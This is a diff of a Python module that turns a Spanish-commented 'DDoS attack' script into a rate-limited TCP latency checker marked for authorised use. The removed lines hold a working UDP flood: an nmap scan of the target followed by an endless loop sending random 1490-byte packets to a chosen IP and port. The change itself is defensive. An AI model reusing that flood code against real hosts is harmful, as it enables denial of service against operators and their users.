@@ -1,134 +1,82 @@
-import os
-import time
+"""Pruebas de disponibilidad de servicios autorizados.
+
+Mantiene la compatibilidad con el nombre historico del modulo, pero ya no
+implementa un flood continuo.
+"""
+
+from __future__ import annotations
+
 import socket
-import random
-import nmap
-from colorama import *
-from datetime import datetime
+import time
+from contextlib import closing
 
-# Función para limpiar la pantalla de la terminal.
-def clear_screen():
-    os.system("cls" if os.name == "nt" else "clear")
+from colorama import Fore, init
+from Python.ui import draw_banner, pause
 
-# Función para validar si la entrada es una dirección IP válida o una URL válida.
-def validate_input(input_data):
-    try:
-        socket.inet_aton(input_data) # Intenta convertir la entrada en una dirección IP válida.
-        return True
-    except socket.error:
-        return False
+init(autoreset=True)
+COMMON_ASCII = r"""
+ DDoS
+"""
+BANNER_COLOR = "\033[91m"
 
-# Función para realizar el escaneo de puertos con Nmap.
-def scan_ports(ip):
-    # Información sobre el inicio del escaneo.
-    print("\n Escaneando puertos con Nmap...")
-    # Crear un objeto nmap.PortScanner().
-    nm = nmap.PortScanner()
-    # Realizar el escaneo de puertos con argumentos específicos.
-    nm.scan(hosts=ip, arguments='-v -sV')  # Escaneo de todos los puertos, con salida detallada y detección de versiones.
 
-    # Mostrar los puertos abiertos durante el escaneo.
-    for host in nm.all_hosts():
-        print(f"Host : {host} ({nm[host].hostname()})")
-        print("State : %s" % nm[host].state())
-        for proto in nm[host].all_protocols():
-            print("Protocol : %s" % proto)
-
-            # Obtener la lista de puertos y clasificarla.
-            port_list = nm[host][proto].keys()
-            sorted(port_list)
-            for port in port_list:
-                # Verificar si el puerto está abierto y mostrar su estado.
-                if nm[host][proto][port]['state'] == 'open':
-                    print("Port : %s\tState : %s" % (port, nm[host][proto][port]['state']))
-
-# Función para iniciar el ataque DDoS.
-def start_ddos_attack(ip, port):
-    # Crear el socket UDP.
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-
-    # Limpiar la pantalla antes de iniciar el ataque.
-    clear_screen()
-    # Mostrar mensaje de inicio del ataque.
-    print(Fore.BLACK + Back.GREEN + "\n[+] Attack Starting")
-    # Esperar un breve momento antes de continuar.
-    time.sleep(0.3)
-
-    # Contador de paquetes enviados.
-    sent = 0
-
-    try:
-        while True:
-            # Enviar paquete UDP al objetivo.
-            sock.sendto(bytes, (ip, port))
-            # Incrementar el contador de paquetes enviados.
-            sent = sent + 1
-            # Limpiar la pantalla y mostrar información del ataque.
-            clear_screen()
-            banner()
-            print("IP Target: ", ip)
-            print("Port: ", port)
-            print("Packets Sent: ", sent)
-    except KeyboardInterrupt:
-        # Mostrar mensaje cuando se detiene el ataque por interrupción del teclado.
-        banner()
-        print(Fore.BLACK + Back.RED + "\n[+] Attack Stopped" + Style.RESET_ALL)
-
-# Función para mostrar el banner del programa.
 def banner():
-    cartel = r"""
-    ___  ___      ___     _  _   _           _   
-   |   \|   \ ___/ __|   /_\| |_| |_ __ _ __| |__
-   | |) | |) / _ \__ \  / _ \  _|  _/ _` / _| / /
-   |___/|___/\___/___/ /_/ \_\__|\__\__,_\__|_\_\                                            
-                                             
-    """
-    clear_screen()
-    print(Fore.LIGHTYELLOW_EX + cartel)
-    print("**************************************************" + Style.RESET_ALL)
+    draw_banner("", COMMON_ASCII, "Prueba controlada de latencia", BANNER_COLOR)
 
-# Variable para controlar la ejecución del programa.
-ejecutar_programa = True
 
-# Función para salir del programa.
-def salir():
-    global ejecutar_programa
-    ejecutar_programa = False
+def resolve_target(target: str) -> str:
+    return socket.gethostbyname(target)
 
-# Función principal.
+
+def probe_tcp(ip: str, port: int, attempts: int, timeout: float) -> list[float]:
+    timings = []
+    for _ in range(attempts):
+        start = time.perf_counter()
+        try:
+            with closing(socket.create_connection((ip, port), timeout=timeout)):
+                elapsed = (time.perf_counter() - start) * 1000
+                timings.append(elapsed)
+        except OSError:
+            elapsed = (time.perf_counter() - start) * 1000
+            timings.append(elapsed)
+        time.sleep(0.2)
+    return timings
+
+
 def ddos_attack_main():
-    clear_screen()
-    banner()
-    global ejecutar_programa
-    while ejecutar_programa:
-        # Validar la entrada del usuario para IP o URL.
-        while True:
-            print("* Pulse Ctrl + C para parar el ataque (una vez activo)\n")
-            print("* Escribe 'n' para volver al menu")
-            print("____________________________________________________")
-            target = input("\nIP o URL objetivo (sin http o https): ")
-            if target.lower() == 'n':
-                salir()  # Salir del programa.
-                break
-            elif validate_input(target):
-                break
-            else:
-                print(Fore.BLACK + Back.RED + " Error al insertar datos, revise el formato " + Style.RESET_ALL)
+    while True:
+        banner()
+        print("Uso autorizado y defensivo solamente.\n")
+        target = input("Host o IP a comprobar ('n' para volver): ").strip()
+        if target.lower() == "n":
+            return
 
-        if not ejecutar_programa:
-            break
+        try:
+            ip = resolve_target(target)
+        except socket.gaierror:
+            pause(Fore.RED + "No se pudo resolver el objetivo. Pulsa Enter para continuar...")
+            continue
 
-        scan_ports(target)
+        try:
+            port = int(input("Puerto TCP a comprobar: ").strip())
+            attempts = int(input("Numero de intentos (1-20, recomendado 5): ").strip() or "5")
+        except ValueError:
+            pause(Fore.RED + "Debes introducir numeros validos. Pulsa Enter para continuar...")
+            continue
 
-        while True:
-            try:
-                port = int(input("Inserte puerto para el ataque: "))
-                break
-            except ValueError:
-                print(Fore.BLACK + Back.RED + "Datos inválidos" + Style.RESET_ALL)
+        attempts = max(1, min(20, attempts))
+        timings = probe_tcp(ip, port, attempts=attempts, timeout=2.0)
+        avg = sum(timings) / len(timings)
 
-        start_ddos_attack(target, port)
+        print(Fore.CYAN + f"\nObjetivo resuelto: {target} -> {ip}")
+        print("Tiempos por intento (ms):", ", ".join(f"{t:.2f}" for t in timings))
+        print(Fore.GREEN + f"Latencia media: {avg:.2f} ms")
+        print(
+            Fore.YELLOW
+            + "Si el servicio no responde, revisa firewall, routing o que el puerto este escuchando."
+        )
+        pause()
+
 
 if __name__ == "__main__":
     ddos_attack_main()
